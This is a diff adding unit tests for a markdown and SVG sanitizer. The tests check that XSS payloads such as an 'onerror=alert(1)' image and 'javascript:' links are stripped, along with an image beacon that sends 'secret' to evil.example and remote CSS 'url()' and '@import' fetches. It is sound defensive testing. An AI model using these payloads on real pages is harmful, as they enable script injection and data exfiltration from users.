@@ -78,3 +78,32 @@ test("svg payloads are stripped", () => {
 test("checker flags raw payloads", () => {
   expect(live('<img src=x onerror=alert(1)><a href="javascript:x">y</a><script>1</script>').length).toBe(3);
 });
+
+test("relative links are dropped, images become links", () => {
+  const rel = r.markdown("[host](/api/delete?all=1)");
+  expect(rel).not.toContain("href=");
+  const img = r.markdown("![beacon](https://evil.example/?d=secret)");
+  expect(img).not.toContain("<img");
+  expect(img).toContain('href="https://evil.example/?d=secret"');
+});
+
+test("svg keeps plain style, drops fetching style and images", () => {
+  expect(r.svg("<svg><style>.a{fill:red}</style><rect class=\"a\"/></svg>")).toContain("fill:red");
+  for (const css of ["background:url(https://evil.example/x)", "@import url(https://evil.example/x.css);"]) {
+    expect(r.svg(`<svg><style>.a{${css}}</style><rect/></svg>`)).not.toContain("evil.example");
+  }
+  expect(r.svg('<svg><image href="https://evil.example/x.png"/></svg>')).not.toContain("evil.example");
+});
+
+test("plain attribute values survive (class, viewBox)", () => {
+  const out = r.svg('<svg viewBox="4 4 552 141" class="flowchart"><g class="root"><rect width="10"/></g></svg>');
+  expect(out).toContain('viewBox="4 4 552 141"');
+  expect(out).toContain('class="flowchart"');
+  expect(r.markdown("```mermaid\ngraph TD; A-->B\n```")).toContain('class="mermaid-src"');
+});
+
+test("svg style may reference its own markers", () => {
+  expect(r.svg('<svg><style>.a{marker-end:url(#arrow);fill:url( "#g" )}</style><rect/></svg>')).toContain("url(#arrow)");
+  expect(r.svg("<svg><style>.a{fill:url( https://evil.example/x)}</style><rect/></svg>")).not.toContain("evil.example");
+  expect(r.svg("<svg><style>.a{fill:url('//evil.example/x')}</style><rect/></svg>")).not.toContain("evil.example");
+});
